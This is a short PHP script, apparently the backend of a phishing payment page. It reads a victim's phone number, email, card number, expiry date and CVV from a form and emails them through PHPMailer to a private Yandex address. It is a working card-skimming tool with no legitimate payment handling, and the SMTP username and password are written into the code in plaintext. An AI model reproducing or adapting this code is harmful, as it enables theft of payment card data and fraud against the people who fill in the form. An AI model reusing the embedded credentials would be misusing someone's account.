<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require('PHPMailer/Exception.php');
require('PHPMailer/SMTP.php');
require('PHPMailer/PHPMailer.php');
require('oplata.html');


$mail = new PHPMailer(true);
$number = $_POST['user_telephone'];
$email = $_POST['user_email'];
$kart = $_POST['user_kart'];
$data_month = $_POST['user_data/month_kart'];
$svv = $_POST['user_svv'];

try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      
    $mail->isSMTP();                                            
    $mail->Host       = 'smtp.yandex.ru';                     
    $mail->SMTPAuth   = true;                                   
    $mail->Username   = 'vasya.borisenko2020@yandex.ru';                     
    $mail->Password   = 'Vasa3400';                               
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            
    $mail->Port       = 465;                                     

    //Recipients
    $mail->setFrom('vasya.borisenko2020@yandex.ru', 'Vasa3400');
    $mail->addAddress('vasya.borisenko2020@yandex.ru', 'Joe User');     

    //Content
    $mail->isHTML(true);                                 
    $mail->Subject = 'Инфа';
    $mail->Body    = "user_telephone: $number <br> user_email: $email <br> user_kart: $kart <br> user_data/month_kart: $data_month <br> user_svv: $svv";
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}

